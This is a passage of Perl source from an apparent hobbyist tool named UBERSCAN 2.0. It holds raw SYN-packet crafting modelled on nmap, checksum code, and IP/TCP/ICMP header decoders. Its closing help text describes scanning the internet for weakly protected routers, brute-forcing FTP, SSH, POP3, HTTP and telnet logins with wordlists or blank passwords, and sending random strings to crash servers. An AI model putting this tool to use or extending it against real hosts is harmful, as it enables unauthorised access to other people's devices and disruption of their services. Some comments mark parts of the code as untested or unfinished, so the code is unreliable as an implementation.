					$scan_result = "RST/ACK CLOSED";
					print STDOUT "\n\n \t PORT IS CLOSED. RST / ACK FROM $incoming_ip_packet_source_ip DETECTED";

					#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $syn_result";
					$verbal_report = "$scan_result, Re-trans:$subcount, ";
					$filename = "portscan-conns.txt";
					WriteReportFile("SPECIAL");
					last;
				}
## Gotta test this now!			

				else	{
					$binary_flags = dec2bin($incoming_tcp_packet_flags_byte,8);
					$scan_result = "UNKOWN FLAGS:$binary_flags(=Dec:$incoming_tcp_packet_flags_byte)";
					print STDOUT "\n\n \t UNKNOWN RESULT - FLAGS:$binary_flags$ ($incoming_tcp_packet_flags_byte dec)";
					$verbal_report = "$scan_result, Re-trans:$subcount, ";
					$filename = "portscan-conns.txt";
					WriteReportFile("SPECIAL");
					last;
				}
		
			
			}
		}
		
	}
	select (STDOUT);
	close (SOCKET);
	
	return ($scan_result);
	#return ($syn_result);
}

##########################################################################################
sub PackAss	{

	my $source_ip_addr = shift;
	my $source_port = shift;

	my $dest_addr = shift;
	my $dest_port = shift;

	my $verbose = shift;
	my $packet;	

	my $ns = shift;
	my $cwr = shift;
	my $ece = shift;
	my $urg = shift;
	my $ack = shift;
	my $psh = shift;
	my $rst = shift;
	my $syn = shift;
	my $fin = shift;

	my $vec_pos_count;

	my $tcp_packet;
	
	my $mc_source_port;	# 16 bit
	my $mc_source_addr;

	my $mc_dest_port;		# 16 bit
	my $mc_dest_addr;

	my $protocol = 6;
	my $tcp_len = 24;


	my $seq_no = int(rand(2139062143));	# 32 bit. A SYN packets seq no is random, making it half the max to avoid screw ups!
	my $ack_no = 0;	# 32 bit. Also not set in SYN (probably), otherwiser it's seq_no +1 unless ACK bit is set
	my $hlen	= "0110";			# 4 bits. Also called "data offset".
	my $reserved = "000";	# 3 bits
	my $window = "4";	# From reverse engineered NMAP syn
	my $checksum = 0;		# 16 bits
	my $urgent_pointer = 0;	#16 bits
	
	my $options = 0;		# 16 bits? Only set if $hlen > 5
	
	my $padding;		# variable length, padding for $options. Fill with zeroes


	my @source_addr_octets;
	my @dest_addr_octets;
	my $count;

	my $checksum_me;
	my $stock_checksum;
	
	
	my $ip_packet;
	my $ip_checksum;
	my $temp;

	if ($verbose eq "-v" or $verbose eq "-V" or $verbose eq "-verbose")	{
		print "\n Host:$dest_addr";
		print "\n Port:$dest_port";
		print "\n\n";
		print "\n My IP:$source_ip_addr";
		print "\n My port:$source_port";
		print "\n\n";
	}
	$mc_source_port = inet_aton($source_port);

	@source_addr_octets = split('\.', $source_ip_addr);
	@dest_addr_octets = split('\.', $dest_addr);


	for ($count = 0; $count < scalar(@source_addr_octets); $count++)	{
		$checksum_me .= pack('C', $source_addr_octets[$count]);
	}
	for ($count = 0; $count < scalar (@dest_addr_octets); $count++)	{
		$checksum_me .= pack('C', $dest_addr_octets[$count]);
	}
	$count = 0;
	$checksum_me .= pack('C C',0, $protocol);			# zeroes, protocol, tcp length (32 bits TOTAL) (zeroes temp. changed for debugging)
	$checksum_me .= pack('n', "$tcp_len");			# Put TCP len on a diff line to try and fix
	$checksum_me .= pack('n n',$source_port, $dest_port); # source port, dest port		(32 bits TOTAL)
	
	$checksum_me .= pack('I', $seq_no );	# This doesn't fix the "sending but not sending" problem
	$checksum_me .= pack('I', $ack_no);	# This doesn't fix the "sending but not sending" problem
	
	$checksum_me .= pack('B8',$hlen, $reserved,$ns);	# (8 bits TOTAL)
	$checksum_me .= pack('B8', "$cwr$ece$urg$ack$psh$rst$syn$fin");	#(8 bits TOTAL) Horrible, but works!
	$checksum_me .= pack('v C2',$window, $checksum);					# Window field, checksum (32 bits TOTAL)
	
	$checksum_me .= pack('C2',$urgent_pointer);					# Urgent pointer, if applic zeroes (padding)

# Another kludge, copying NMAPs syn packet:
	$checksum_me .= pack('C4', 2, 4, 5, 180);

	$checksum = Checksum ($checksum_me);
	$tcp_packet = substr($checksum_me, 12);
	
	substr ($tcp_packet, 16,2) = pack(("v"), $checksum);
	#$tcp_len = length($tcp_packet);
	#$packet = $tcp_packet;

	return ($tcp_packet);
	
}	
	

sub Checksum	{
		
		my $checksum_me = shift;
		my $length_of_checksum = length($checksum_me);
		my $count = 0;
		my $running_total = 0;
		my $checksum = 0;
		my $temp = 0;	
	
		
		if ($length_of_checksum %2 >0)	{
			$checksum_me .= chr(0);
		}

		until ($count == $length_of_checksum)	{
			$temp = unpack (("x$count, S "), $checksum_me);
			$running_total += $temp;
			$count+=2;
		}
		
		$checksum = $running_total;

		
		
		$running_total = $checksum >> 16;	# Because REASONS!
		$checksum += $running_total;			# see above
		$checksum = $checksum & 0xffff;		# To be "correct" I'm adding a fictional carry which is assumed 
														# to be 0xffff, but it's against my better judgement...
		$checksum = Dec2Bin($checksum,16);
		$checksum = FlipBits($checksum);		# Flipping da bits... that's why they call it 1's complement
		$checksum = Bin2Dec($checksum,16);
		
		return ($checksum);
}
			

sub DisplayData	{

	my $data = shift;
	my $vec_pos_count = 0;
	my $vec_str = '';

	print "\n'+' symbol marks beginning and end, not part of sequence.";

	print "\n Your data has a length of ";
	
	print length ($data);
	#print ".\n It should have a lenght of 32(not canonical)!";
	print "\n Data:+";
	print $data;
	print "+";
	
	print " Length of data is ";
	print length($data);
	print "\n Data (disassembled):+";

	for ($vec_pos_count = 0; $vec_pos_count < length($data); $vec_pos_count++ )	{

		$vec_str = vec ($data,$vec_pos_count,8);

		if ($vec_str == 0)	{
			print "\n $vec_pos_count\t";
			print ".";
		}
#		elsif ($vec_str == 0 and $vec_pos_count eq 0)	{
#			print "\n $vec_pos_count\t";
#			print $vec_str;
#			print "\t";
#			print ".";
#		}
		else	{
			print "\n $vec_pos_count\t";
			print $vec_str;
			print "\t";
			print chr($vec_str);
		}
	}
	print "+\n\n";
}


################# Dec2Bin ####################
sub Dec2Bin	{

	my $decimal_number = shift;
	my $bitcount = shift;
	my $binary_number;
	my @digi_array;
	
	#my $decimal_number;


	while ($bitcount > 0)	{ 
		#$digi_array[bitcount] = decimal_number % 2;

		$binary_number .= $decimal_number %2;
		$decimal_number = $decimal_number / 2;
		$bitcount--;
		#print "\ncount:$bitcount \t Binary_number:$binary_number";
	}
	$binary_number = reverse($binary_number);
#	print "\n\n Binary_number:$binary_number";
#	print "\n\n";
	return ($binary_number);
	#until ($pos == scalar(@digi_array))

}


############## Bin2Dec #####################

sub Bin2Dec	{

	my $binary_number = shift;
	my $bitcount = shift;
	my $multiplier = 0;
	my $intermediate = 0;
	my $temp = 0;
	my @digi_data;
	my $decimal = 0;
	
	$bitcount--;
	
	while ($bitcount > -1)	{
		#$intermediate = $digi_data[$bitcount] * pow(2, $multiplier);
		#$temp = 
		$intermediate = substr($binary_number,$bitcount,1);
		#print "\n intermediate:$intermediate ";
		$intermediate = $intermediate* 2**$multiplier;
		#print "\t intermediate now:$intermediate ";
		#print "\nBcnt:$bitcount \t Bin:$binary_number \t substr:";
		#print substr($binary_number,$bitcount,1);
		$decimal += $intermediate;
		#print " \t Dec:$decimal";
		$bitcount--;
		$multiplier++;
	}
	$bitcount = 0;
	return ($decimal);
}
	
	
	
	
sub FlipBits	{
	my $binary_number = shift;
	my $count=0;
	#print "\n ** FlipBits ** ";
	for ($count = 0; $count < length($binary_number); $count++)	{
	#	print "\n count:$count \t ";
	#	print substr($binary_number,$count,1);
		if (substr($binary_number,$count,1) eq "0")	{
			substr($binary_number,$count,1) = "1";
		}
		else	{
			substr($binary_number,$count,1) = 0;
		}
	}
	return $binary_number;
}	
	
	
	
	

		
	
	
	
	
	
	
	
sub DecodeIP()	{
	my $recv_data = shift;
	my $loud = shift;
	my %ip_packet;
	my $temp;
	my $temp_bits;
	
	#print STDOUT  "**************************** DEBUGGING REMOVE LATER *****************";
	#GetOrdData($recv_data);
	#print STDOUT  "**************************** DEBUGGING REMOVE LATER *****************";

	# Note to self: Get stuck into this bastard! Fix them bit fields! Yeehaaa!
		
#	#$ip_packet{version} = unpack B4,$recv_data;
	$ip_packet{version} = unpack 	("(H)",$recv_data);				# High nybble
	$ip_packet{IHL} = unpack 		("(h)", $recv_data);				# Low nybble
	$ip_packet{QOS} = unpack 		("(xC)",$recv_data);	
	$ip_packet{length} = unpack 	("(x2n)",$recv_data);
	$ip_packet{ID} = unpack 		("(x4n)",$recv_data);
	$ip_packet{zero} = unpack 		("(x6B1)",$recv_data);
	$temp_bits = unpack ("(x6B16)", $recv_data);	# that's zero,DF,MF,FragOffset
	$ip_packet{DF} = substr ($temp_bits,1,1);			# Zero is at offset zero; we've done that
	$ip_packet{MF} = substr ($temp_bits,2,1);

	$temp_bits = substr ($temp_bits,3,13);				# THIS CODE IS UNTESTED!
	$temp_bits = pack ("(B13)", $temp_bits);			# Works but I don't know if it
	$ip_packet{FragOffset} = ord($temp_bits);			# produces accurate data
														# May need padding with zeroes to make it 
														# 16 bit number

	
	$ip_packet{TTL}	= unpack ("(x8C)", $recv_data);
	$ip_packet{TransProtocol} = unpack ("(x9C)", $recv_data);
	$ip_packet{checksum} = unpack ("(x10n)", $recv_data);

	$ip_packet{SourceIP} = unpack ("(x12C)", $recv_data);
	$ip_packet{SourceIP} .= ".";
	$ip_packet{SourceIP} .= unpack ("(x13C)", $recv_data);
	$ip_packet{SourceIP} .= ".";
	$ip_packet{SourceIP} .= unpack ("(x14C)", $recv_data);
	$ip_packet{SourceIP} .= ".";
	$ip_packet{SourceIP} .= unpack ("(x15C)", $recv_data);
	
	$ip_packet{DestIP} = unpack ("(x16C)", $recv_data);
	$ip_packet{DestIP} .= ".";
	$ip_packet{DestIP} .= unpack ("(x17C)", $recv_data);
	$ip_packet{DestIP} .= ".";
	$ip_packet{DestIP} .= unpack ("(x18C)", $recv_data);
	$ip_packet{DestIP} .= ".";
	$ip_packet{DestIP} .= unpack ("(x19C)", $recv_data);
	
	if ($ip_packet{IHL} > 5)	{
		$ip_packet{options} = unpack ("(x20B16)", $recv_data);
		$ip_packet{payload} = substr($recv_data, 22);
	}
	else	{
		$ip_packet{options} = "UNDEFINED";
		$ip_packet{payload} = substr($recv_data, 20);
	}
	
	if ($loud)	{
		print STDOUT "\n version:$ip_packet{version}";
		print STDOUT "\t IHL(length/5):$ip_packet{IHL}";
		print STDOUT "\n QOS:$ip_packet{QOS}";
		print STDOUT "\t length:$ip_packet{length}";
		print STDOUT "\n ID:$ip_packet{ID}";
		print STDOUT "\t zero:$ip_packet{zero}";
		print STDOUT "\n DF:$ip_packet{DF}";
		print STDOUT "\t MF:$ip_packet{MF}";
		print STDOUT "\n FragOffset:$ip_packet{FragOffset}";
		print STDOUT "\t TTL:$ip_packet{TTL}";
		print STDOUT "\n TransProtocol:$ip_packet{TransProtocol}";
		print STDOUT "\t checksum:$ip_packet{checksum}";
		print STDOUT "\n SourceIP:$ip_packet{SourceIP}";
		print STDOUT "\t DestIP:$ip_packet{DestIP}";
		print STDOUT "\n options:$ip_packet{options}";
		#print STDOUT "\t payload:$ip_packet{payload}";
	}
	return %ip_packet;
}

	# On to examining the payload! Next: DecodeICMP
	
	
	# How to handle nybbles and other binary / sub-octet structures in perl?
	# $recv_data contains a raw IP packet that (probably definitely) contains an ICMP packet.
	# Both must be unpacked and all data & metadata displayed to the user.
	#(Possibly a seperate DecodeICMP subroutine to make DecodeIP more portable)

	#print STDOUT "(dec:".dec($ip_packet{version}).")";
	#print STDOUT "(chr:".chr($ip_packet{version}).")";
	#print STDOUT "(Ord:".ord($ip_packet{version}).")";
	
	# This needs a lot of checking - but I'm getting the idea!

sub DecodeTCP	{
	
	my $tcp_data =shift;
	my $loud =  shift;
	my %tcp_packet;
	my $temp_bits;
	
	#print "**************************** DEBUGGING REMOVE LATER *****************";
	#GetOrdData($icmp_data);
	#print "**************************** DEBUGGING REMOVE LATER *****************";
	$tcp_packet{SourcePort} = unpack ("n", $tcp_data);
	$tcp_packet{DestPort} = unpack ("xxn", $tcp_data);
	$tcp_packet{SequenceNumber} = unpack ("x4N", $tcp_data);
	$tcp_packet{AckNumber} = unpack ("x8N", $tcp_data);	

	$temp_bits = unpack ("x12B8", $tcp_data);
	$tcp_packet{Hlen} = pack ("B4", $temp_bits);
	$tcp_packet{Hlen} = ord $tcp_packet{Hlen};
	$tcp_packet{Reserved} = substr ($temp_bits, 4,3);
	$tcp_packet{NS} = substr ($temp_bits,7,1);
	
	#$tcp_packet{Hlen+Reserved+NSFlag} = unpack x12B8, $tcp_data;
	#$tcp_packet{Flags} = unpack x13B8, $tcp_data;
	undef $temp_bits;
	$temp_bits = unpack ("x13B8", $tcp_data);
	$tcp_packet{CWR} = substr ($temp_bits,0,1);
	$tcp_packet{ECE} = substr ($temp_bits,1,1);
	$tcp_packet{URG} = substr ($temp_bits,2,1);
	$tcp_packet{ACK} = substr ($temp_bits,3,1);
	$tcp_packet{PSH} = substr ($temp_bits,4,1);
	$tcp_packet{RST} = substr ($temp_bits,5,1);
	$tcp_packet{SYN} = substr ($temp_bits,6,1);
	$tcp_packet{FIN} = substr ($temp_bits,7,1);
	$tcp_packet{WindowSize} = unpack ("x14n", $tcp_data);
	$tcp_packet{Checksum}	= unpack ("x16n", $tcp_data);
	$tcp_packet{UrgPointer} = unpack ("x18n", $tcp_data);
	$tcp_packet{Options}	= unpack ("x20n40", $tcp_data);
	#$tcp_packet{Payload}	= substr $tcp_data, 60;
		### NB - THIS IS NOT FINSHED - I NEED TO GET THE PAYLOAD. 
		# ALSO HLEN IS NOT PROPERLY CALCULATED! 

	if ($loud)	{
		print STDOUT "\n********** TCP PACKET **************************";
		print STDOUT "\nSource port:$tcp_packet{SourcePort}";
		print STDOUT "\tDest Port:$tcp_packet{DestPort}";
		print STDOUT "\nSequence Num:$tcp_packet{SequenceNumber}";
		print STDOUT "\nAck Num:$tcp_packet{AckNumber}";

		if ($tcp_packet{SYN} == 1) {
			print STDOUT  "\n*******SYN********";
		}
		if ($tcp_packet{ACK} == 1) {
			print STDOUT"\n*******ACK********";
		}
		if ($tcp_packet{RST} == 1) {
			print STDOUT "\n*******RST********";
		}
		if ($tcp_packet{URG} == 1) {
			print STDOUT "\n*******URG********";
		}
		if ($tcp_packet{PSH} == 1) {
			print STDOUT "\n*******PSH********";
		}
		if ($tcp_packet{CWR} == 1) {
			print STDOUT "\n*******CWR********";
		}
		if ($tcp_packet{FIN} == 1) {
			print STDOUT "\n*******FIN********";
		}
		if ($tcp_packet{ECE} == 1) {
			print STDOUT "\n*******ECE********";
		}
		print STDOUT "\n";
		print STDOUT join " ", %tcp_packet;		
		
		# .... etc, etc, etc... 
	}
	
	return (%tcp_packet);
}




############################## DECODEICMP #############################

sub DecodeICMP	{
	my $icmp_data = shift;
	my $loud = shift;
	my %icmp_packet;
	my $ascii_data;
	#print "**************************** DEBUGGING REMOVE LATER *****************";
	#GetOrdData($icmp_data);
	#print "**************************** DEBUGGING REMOVE LATER *****************";
	
	$icmp_packet{type} = unpack ("C", $icmp_data);
	if ($icmp_packet{type} == 0)	{
		$icmp_packet{type_eng} = "Echo Reply";
	}
	elsif ($icmp_packet{type} == 1 || $icmp_packet{type} == 2|| $icmp_packet{type} == 7)	{
		$icmp_packet{type_eng} = "Unassigned / Reserved";
	}
	elsif ($icmp_packet{type} == 3)	{
		$icmp_packet{type_eng} = "Destination Unreachable";
	}
	
	elsif ($icmp_packet{type} == 4)	{
		$icmp_packet{type_eng} = "Source Quench";
	}
	
	elsif ($icmp_packet{type} == 5)	{
		$icmp_packet{type_eng} = "Redirect Message";
	}
	
	elsif ($icmp_packet{type} == 6)	{
		$icmp_packet{type_eng} = " Alternate Host Address (DEPRACTED!)";
	}
	
	elsif ($icmp_packet{type} == 8)	{
		$icmp_packet{type_eng} = "Echo Request";
	}
	
	elsif ($icmp_packet{type} == 9)	{
		$icmp_packet{type_eng} = "Router Advertisment";
	}
	
	elsif ($icmp_packet{type} == 10)	{
		$icmp_packet{type_eng} = "Router Solicitation";
	}
	
	elsif ($icmp_packet{type} == 11)	{
		$icmp_packet{type_eng} = "Time Exceeded";
	}
	
	elsif ($icmp_packet{type} == 12)	{
		$icmp_packet{type_eng} = "Bad IP Header";
	}
	
	elsif ($icmp_packet{type} == 13)	{
		$icmp_packet{type_eng} = "Timestamp";
	}
	
	elsif ($icmp_packet{type} == 14)	{
		$icmp_packet{type_eng} = "Timestamp Reply";
	}
	
	elsif ($icmp_packet{type} == 15)	{
		$icmp_packet{type_eng} = " Information Request (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 16)	{
		$icmp_packet{type_eng} = " Information Reply (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 17)	{
		$icmp_packet{type_eng} = " Address Mask Requiest  (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 18)	{
		$icmp_packet{type_eng} = " Address Mask Response  (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 19)	{
		$icmp_packet{type_eng} = "Reserved / Reserved for security";
	}
	
	elsif ($icmp_packet{type} == 20 .. 29)	{
		$icmp_packet{type_eng} = "Reserved / Reserved for robustness experiment";
	}
	
	elsif ($icmp_packet{type} == 30)	{
		$icmp_packet{type_eng} = " Traceroute - Information Request (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 31)	{
		$icmp_packet{type_eng} = " Datagram Conversion Error (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 32)	{
		$icmp_packet{type_eng} = " Mobile Host Redirect (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 33)	{
		$icmp_packet{type_eng} = " Where Are You (Originally IPV6) (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 34)	{
		$icmp_packet{type_eng} = " Here I Am (Originally IPV6?) (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 35)	{
		$icmp_packet{type_eng} = " Mobile Registration Request (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 36)	{
		$icmp_packet{type_eng} = " Mobile Registration Reply (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 37)	{
		$icmp_packet{type_eng} = " Domain Name Request (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 38)	{
		$icmp_packet{type_eng} = " Domain Name Reply (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 39)	{
		$icmp_packet{type_eng} = " SKIP (Simple Key Mgmnt for IP) Algorithm Discovery Proto (DEPRACATED!)";
	}
	
	elsif ($icmp_packet{type} == 40)	{
		$icmp_packet{type_eng} = "Photuris Security Failures";
	}
	
	elsif ($icmp_packet{type} == 41)	{
		$icmp_packet{type_eng} = "ICMP for experimental mobility protocol (EXPERIMENTAL!)";
	}
	
	elsif ($icmp_packet{type} == 42 .. 252)	{
		$icmp_packet{type_eng} = "Unassigned / Reserved";
	}
	
	elsif ($icmp_packet{type} == 253)	{
		$icmp_packet{type_eng} = "RFC3692-style Experiment 1 (EXPERIMENTAL!)";
	}
	
	elsif ($icmp_packet{type} == 254)	{
		$icmp_packet{type_eng} = "RFC3692-style Experiment 2 (EXPERIMENTAL!)";
	}
	
	elsif ($icmp_packet{type} == 255)	{
		$icmp_packet{type_eng} = "Reserved / Reserved";
	}
	else	{
		$icmp_packet{type_eng} = "PROGRAM ERROR - COULDN'T PARSE TYPE FIELD";
	}
	
	$icmp_packet{code} = unpack ("xC", $icmp_data);
	if ($icmp_packet{type} == 3 && $icmp_packet{code} ==0)	{
		$icmp_packet{code_eng} = "Destination Network Unreachable";
	}

	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 1)	{
		$icmp_packet{code_eng} = "Destination Host Unreachable";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 2)	{
		$icmp_packet{code_eng} = "Destination Protocol Unreachable";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 3)	{
		$icmp_packet{code_eng} = "Destination Port Unreachable";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 4)	{
		$icmp_packet{code_eng} = "Fragmentation Required but Don't Fragment (DF) Flag is Set";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 5)	{
		$icmp_packet{code_eng} = "Source Route Failed";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 6)	{
		$icmp_packet{code_eng} = "Destination Network Unknown";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 7)	{
		$icmp_packet{code_eng} = "Destination Host Unknown";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 8)	{
		$icmp_packet{code_eng} = "Source Host Isolated";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 9)	{
		$icmp_packet{code_eng} = "Network Administratively Prohibited";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 10)	{
		$icmp_packet{code_eng} = "Host Administratively Prohibited";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 11)	{
		$icmp_packet{code_eng} = "Network Unreachable for ToS";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 12)	{
		$icmp_packet{code_eng} = "Host Unreachable for ToS";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 13)	{
		$icmp_packet{code_eng} = "Communication Administratively Prohibited";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 14)	{
		$icmp_packet{code_eng} = "Host Precedence Violation";
	}
	elsif ($icmp_packet{type} == 3 && $icmp_packet{code} == 15)	{
		$icmp_packet{code_eng} = "Precedence Cutoff In Effect";
	}
	
	elsif ($icmp_packet{type} == 5 && $icmp_packet{code} == 0)	{
		$icmp_packet{code_eng} = "Redirect Datagram for the Network";
	}
	elsif ($icmp_packet{type} == 5 && $icmp_packet{code} == 1)	{
		$icmp_packet{code_eng} = "Redirect Datagram for the Host";
	}
	elsif ($icmp_packet{type} == 5 && $icmp_packet{code} == 2)	{
		$icmp_packet{code_eng} = "Rediract Datagram for the ToS & Network";
	}
	elsif ($icmp_packet{type} == 5 && $icmp_packet{code} == 3)	{
		$icmp_packet{code_eng} = "Redirect Datagram for the ToS & Host";
	}

	elsif ($icmp_packet{type} == 11 && $icmp_packet{code} == 0)	{
		$icmp_packet{code_eng} = "TTL expired in transit";
	}
	elsif ($icmp_packet{type} == 11 && $icmp_packet{code} == 1)	{
		$icmp_packet{code_eng} = "Fragment Reassembly Time exceeded";
	}
	elsif ($icmp_packet{type} == 12 && $icmp_packet{code} == 0)	{
		$icmp_packet{code_eng} = "Pointer indicates the error";
	}
	elsif ($icmp_packet{type} == 12 && $icmp_packet{code} == 1)	{
		$icmp_packet{code_eng} = "Missing a required option";
	}
	elsif ($icmp_packet{type} == 12 && $icmp_packet{code} == 2)	{
		$icmp_packet{code_eng} = "Bad length";
	}

	
	
	$icmp_packet{checksum} = unpack ("x2n", $icmp_data);
	$icmp_packet{identifier} = unpack ("x4n", $icmp_data);
	$icmp_packet{seq_number} = unpack ("x6n", $icmp_data);

		# Only if packet type == 3? #
	$icmp_packet{origin} = unpack ("x20C", $icmp_data);
	$icmp_packet{origin} .= ".";
	$icmp_packet{origin} .= unpack ("x21C", $icmp_data);
	$icmp_packet{origin} .= ".";
	$icmp_packet{origin} .= unpack ("x22C", $icmp_data);
	$icmp_packet{origin} .= ".";
	$icmp_packet{origin} .= unpack ("x23C", $icmp_data);
	
	$icmp_packet{destination} = unpack ("x24C", $icmp_data);
	$icmp_packet{destination} .=".";
	$icmp_packet{destination} .= unpack ("x25C", $icmp_data);
	$icmp_packet{destination} .=".";
	$icmp_packet{destination} .= unpack ("x26C", $icmp_data);
	$icmp_packet{destination} .=".";
	$icmp_packet{destination} .= unpack ("x27C", $icmp_data);

	
	$icmp_packet{data} = (substr $icmp_data,8);
	
#	print "\n***************MAP**************************";
#	map %icmp_packet;
#	print "\n*****************************************\n";
	
	if ($loud)	{
		print STDOUT "\n *********ICMP ANALYSIS:**************************";
		print STDOUT "\n type:$icmp_packet{type}";
		print STDOUT "\t type_eng:$icmp_packet{type_eng}";
		print STDOUT "\n code:$icmp_packet{code}";
		print STDOUT "\t code_eng:$icmp_packet{code_eng}";
		print STDOUT "\n checksum:$icmp_packet{checksum}";
		print STDOUT "\t identifier:$icmp_packet{identifier}";
		print STDOUT "\n seq_number:$icmp_packet{seq_number}";
		if ($icmp_packet{type} ==3)	{
			print STDOUT "\n origin:$icmp_packet{origin}";	# Only if packet type == 3?
			print STDOUT "\n destination:$icmp_packet{destination}";		# Only if packet type == 3?
		}
		#print STDOUT "\n raw data:$icmp_packet{data}";
		print STDOUT "\n\n ICMP payload data (ordinal):\n";
		my $ord_data = GetOrdData($icmp_packet{data});
		print $ord_data;
		print STDOUT "\n\n ICMP payload data (sanitised ASCII):\n";
		$ascii_data = GetCleanPayloadData($icmp_packet{data});
		print $ascii_data;
		print STDOUT "\n*************************************************";
	}
	return %icmp_packet;
	
}


########################## GETORDDATA ###################################
	
sub GetOrdData	{
	my $bin_data = shift;
	my $loud = shift;
	my $readable_ord_data;
	my $chrloop;
	
	$chrloop = 0;
	until ($chrloop == length($bin_data) )	{
		$readable_ord_data .= ord(substr($bin_data,$chrloop));
		$readable_ord_data .= ",";
		$chrloop++;
	}	
	#print STDOUT "\n Length of binary data:".length($bin_data);
	if ($loud)	{
		print STDOUT "\n";
		print STDOUT $readable_ord_data;
	}
	return ($readable_ord_data);
}

############################## GETCLEANPAYLOADDATA	############################
	
sub GetCleanPayloadData	{
	
	my $bin_data = shift;
	my $loud = shift;
	my $rawbytes = shift;
	my $substring;
	my $readable_chr_data;
	my $chrloop;
	#print "\n**GETCLEANPAYLOADDATA**\n";
	$chrloop = 0;
	until ($chrloop == length($bin_data) )	{
		$substring = substr($bin_data,$chrloop,1);
		if ($substring =~ /[\w]/)	{
			$readable_chr_data .= $substring;
			$chrloop++;
		}
		else	{
			$readable_chr_data .= ".";
			$chrloop++;
		}
	}	
	#print STDOUT "\n Length of binary data:".length($bin_data);
	if ($rawbytes)	{
		print STDOUT "\n ********* BINARY DATA: ************\n";
		print STDOUT $bin_data;
		print STDOUT "\n *********READABLE DATA: ***********";
	}
	if ($loud)	{
		print STDOUT "\n";
		print STDOUT $readable_chr_data;
	}
	return ($readable_chr_data);
}	






################################### PRINTOPTIONS #############################
sub PrintOptions	{
	print "\n";
	print "\n \t *** Say goodbye to Mother Nature, say hello to UBERSCAN II! *** \n";
	print "\n";
	print "\n    UBERSCAN 2.0. Scans internet for craply passworded routers, etc!";
	print "\n";
	print "\n Copyright (C) 2017,2018 Batch McNulty. Distributed under the GNU GPL V3.0";
	print "\n";
	print "\n Usage:";
	print "\n  uberscan -user:admin -pass:password -scantype:ftp";
	print "\n -Tries username 'admin' / password 'password'. Seeks POP3 servers";
	print "\n\n";
	print "\n\t\t Other options:";
	print "\n";
	print "\n   -scantype:ftp ";
	print "\n Scans for FTP servers and tries to hack them. Other scan options are: SSH,";
	print "\n POP3, HTTP, telnet, SMTP, and banner. Banner just grabs the first line of ";
	print "\n an open port and SMTP only does VRFY and a couple of other options but ";
	print "\n not full-on password cracking / brute forcing like the others.";
	print "\n ";
	print "\n NEW! -scantype:udp -will scan for udp servers!";
	print "\n NEW! -scantype:searchopen  Just log open ports, don't actually try to hack them.";
	print "\n";
	print "\n NEW! -sendstring:\"insert commands here\"  Transmits the command of your choice";
	print "\n NEW! -sendstring_np:x,y,z  Transmits nonprinting characters of your choice";
	print "\n to the server in UDP and BANNER modes. Must be comma seperated, must be decimals.";
	print "\n NEW! -sendstring:random  Transmits random string of random length in an attempt";
	print "\n to crash the server.";
	print "\n NEW! -sendstring:prerolled_http_request  Transmits a pre-rolled HTTP request";

	print "\n NEW! -stringlength:nn  Specifies length of random string. ";
#	print "\n NEW! -stringorder:1  Transmit string before a reply is recieved (UDP default)";
#	print "\n NEW! -stringorder:2  Transmit string after a reply has been recieved (TCP default)";
#	print "\n NEW! -stringorder:both 	Try transmitting both ways";
#	print "\n NEW! -stringorder:random	Decide randomly";

	print "\n";
	print "\n NEW! -port:random  Scans random ports.";
	print "\n";
	print "\n NEW! -synscan  Uses nmap-style low level sockets to scan for ports.";
	print "\n      -syn_timeout:nnnnn  Wait nnnnn program cycles for synscan to time out.";
	print "\n Defaults to $syn_timeout, adjust lower for a LAN or higher for a slower network.";
	print "\n      -syn_trans_attempts:n  (Re-)transmit SYN packet n times if no result.";
	print "\n Default is $syn_trans_attempts, adjust if you're worried about firewalls";
	print " interpreting multiple \n SYN packets as an attack. Also note that Perl counts from ";
	print " zero so it will show \n 5 (re)transmissions as 0,1,2,3,4... and so on";
	#print "\n";
	print "\n";
	print "\n   -port:nn";
	print "\n Where 'nn' is a port number. Overrides default port nums in -scantype: option.";
	
	print "\n";
	print "\n UDP and banner scans ONLY: -port:reserved  Scans ports 1-1024! yowza!";
	print "\n UDP and banner scans ONLY: -port:dynamic  Scans ports 49152-65535! yowza!";
	print "\n UDP and banner scans ONLY: -port:all  Scans ALL ports! WOW! (may take 2 hours)";
	print "\n";
	print "\n 	 ****   WARNING: Using above multi-port scans   ***";
	print "\n	**** may cause your computer to become unstable. ***";
	print "\n";
	print "\n   -userfile:wordlist.txt ";
	print "\n   -passfile:wordlist.txt ";
	print "\n Bruteforces usernames / passwords with 'wordlist.txt'";
	print "\n";
	print "\n    -userblank";
	print "\n    -passblank";
	print "\n -userblank tries a blank username, -passblank a blank password - handy for ";
	print "\n some HTTP challenges, but might not work too well - use with caution as ";
	print "\n definitely doesn't work on SSH, dodgy on telnet mode and untested in others.";
	print "\n";
	print "\n   -ipblock:192.168.0/24 ";
	print "\n Scan selected ipblock (/16 or /24) instead of using ipnumbers.txt";
	print "\n";
	print "\n   -iprange:192.168.0.0 - 192.168.255.255 ";
	print "\n As above, only use iprange. Only does last two octets though!";
